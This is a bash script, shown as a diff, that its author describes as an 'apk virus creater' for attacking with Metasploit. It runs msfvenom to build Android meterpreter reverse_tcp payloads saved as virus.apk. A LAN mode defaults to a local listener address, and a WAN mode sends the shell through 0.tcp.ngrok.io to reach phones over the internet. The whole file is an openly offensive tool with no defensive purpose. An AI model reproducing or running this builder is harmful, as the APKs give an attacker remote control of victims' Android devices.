@@ -1,0 +1,178 @@
+#! /bin/bash
+# it has been created by sayon to attack using metasoloit more convinient way.
+
+echo "Virus for.."
+echo  --------------
+echo "|1.LAN attack|"
+echo "|2.WAN attack|"
+echo  --------------
+echo -e "which attack: \c"
+read attack
+if [ $attack == "1"  ]
+   then 
+      echo  ------------------------
+      echo "|1.lhost=192.168.8.100 |"
+      echo "|2.lport=4444          |" 
+      echo "|3.virus name virus.apk|"
+      echo  ------------------------
+      echo "Do you want to change(y/n)"
+      read change
+      if [ $change == "y" ] 
+           then
+              echo -e "Which one you want to change: \c"
+              read chno 
+              if [ $chno == "1" ] 
+                 then 
+                    echo -e "Enter new lhost: \c"
+                    read lhost
+                    echo "Whait while the payload is being create...."
+                    echo "check the payload in (/root/payload) folder"
+                    msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=4444 R > /root/payload/virus.apk
+              elif [ $chno == "2" ] 
+                   then
+                      echo -e "Enter new lport: \c"
+                      read lport
+                      echo "Whait while the payload is being create...."
+                      echo "check the payload in (/root/payload) folder"
+                      msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.8.100 lport=$lport R > /root/payload/virus.apk
+              elif [ $chno == "3" ]
+                   then
+                    echo -e "Enter new virus name: \c"
+                    read payloadname
+                    echo "Whait while the payload is being create...."
+                    echo "check the payload in (/root/payload) folder"
+                    msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.8.100 lport=4444 R > /root/payload/$payloadname.apk
+              elif [ $chno == "1,2" ]
+                   then 
+                    echo -e "Enter new lhost: \c"
+                    read lhost
+                    echo -e "Enter new lport: \c"
+                    read lport
+                    echo "Whait while the payload is being create...."
+                    echo "check the payload in (/root/payload) folder"
+                    msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R > /root/payload/virus.apk
+              elif [ $chno == "2,3" ]
+                   then 
+                    echo -e "Enter new lport :\c"
+                    read lport
+                    echo -e "Enter new payload name: \c"   
+                    read payloadname
+                    echo "Whait while the payload is being create...."
+                    echo "check the payload in (/root/payload) folder"
+                    msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.8.100 lport=$lport R > /root/payload/$payloadname.apk
+              elif [ $chno == "1,3" ]
+                   then     
+                     echo -e "Enter new lhost: \c"
+                     read lhost
+                     echo -e "Enter new payload name: \c"   
+                     read payloadname
+                     echo "Whait while the payload is being create...."
+                     echo "check the payload in (/root/payload) folder"
+                     msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=4444 R > /root/payload/$payloadname.apk
+              elif [ $chno == "1,2,3" ]
+                   then     
+                     echo -e "Enter new lhost: \c"
+                     read lhost
+                     echo -e "Enter new lport :\c"
+                     read lport
+                     echo -e "Enter new payload name: \c"   
+                     read payloadname
+                     echo "Whait while the payload is being create...."
+                     echo "check the payload in (/root/payload) folder"
+                     msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R > /root/payload/$payloadname.apk
+               else
+                 echo "Sorry"
+               fi
+       
+      else
+        echo "Whait while the payload is being created"
+        echo "check the payload in (/root/payload) folder"
+        msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.8.100 lport=4444 R > /root/payload/virus.apk  
+      fi
+elif [ $attack == "2"  ]
+     then
+      echo  ------------------------
+      echo "|1.lhost=0.tcp.ngrok.io|"
+      echo "|2.lport=1234          |" 
+      echo "|3.virus name virus.apk|"
+      echo  ------------------------
+      echo "Do you want to change(y/n)"
+      read change
+      if [ $change == "y" ] 
+           then
+              echo -e "Which one you want to change: \c"
+              read chno 
+              if [ $chno == "1" ] 
+                 then 
+                    echo -e "Enter new lhost: \c"
+                    read lhost
+                    echo "Whait while the payload is being create...."
+                    echo "check the payload in (/root/payload) folder"
+                    msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=1234 R > /root/payload/virus.apk
+              elif [ $chno == "2" ] 
+                   then
+                      echo -e "Enter new lport: \c"
+                      read lport
+                      echo "Whait while the payload is being create...."
+                      echo "check the payload in (/root/payload) folder"
+                      msfvenom -p android/meterpreter/reverse_tcp lhost=0.tcp.ngrok.io lport=$lport R > /root/payload/virus.apk
+              elif [ $chno == "3" ]
+                   then
+                    echo -e "Enter new virus name: \c"
+                    read payloadname
+                    echo "Whait while the payload is being create...."
+                    echo "check the payload in (/root/payload) folder"
+                    msfvenom -p android/meterpreter/reverse_tcp lhost=0.tcp.ngrok.io lport=1234 R > /root/payload/$payloadname.apk
+              elif [ $chno == "1,2" ]
+                   then 
+                    echo -e "Enter new lhost: \c"
+                    read lhost
+                    echo -e "Enter new lport: \c"
+                    read lport
+                    echo "Whait while the payload is being create...."
+                    echo "check the payload in (/root/payload) folder"
+                    msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R > /root/payload/virus.apk
+              elif [ $chno == "2,3" ]
+                   then 
+                    echo -e "Enter new lport :\c"
+                    read lport
+                    echo -e "Enter new payload name: \c"   
+                    read payloadname
+                    echo "Whait while the payload is being create...."
+                    echo "check the payload in (/root/payload) folder"
+                    msfvenom -p android/meterpreter/reverse_tcp lhost=0.tcp.ngrok.io lport=$lport R > /root/payload/$payloadname.apk
+              elif [ $chno == "1,3" ]
+                   then     
+                     echo -e "Enter new lhost: \c"
+                     read lhost
+                     echo -e "Enter new payload name: \c"   
+                     read payloadname
+                     echo "Whait while the payload is being create...."
+                     echo "check the payload in (/root/payload) folder"
+                     msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=1234 R > /root/payload/$payloadname.apk
+              elif [ $chno == "1,2,3" ]
+                   then     
+                     echo -e "Enter new lhost: \c"
+                     read lhost
+                     echo -e "Enter new lport :\c"
+                     read lport
+                     echo -e "Enter new payload name: \c"   
+                     read payloadname
+                     echo "Whait while the payload is being create...."
+                     echo "check the payload in (/root/payload) folder"
+                     msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R > /root/payload/$payloadname.apk
+               else
+                 echo "Sorry"
+               fi
+       
+      else
+        echo "Whait while the payload is being created"
+        echo "check the payload in (/root/payload) folder"
+        msfvenom -p android/meterpreter/reverse_tcp lhost=0.tcp.ngrok.io lport=1234 R > /root/payload/virus.apk  
+      fi
+else
+   echo"sorry"
+fi
+
+
+#cat info: This is a code on apk virus creater
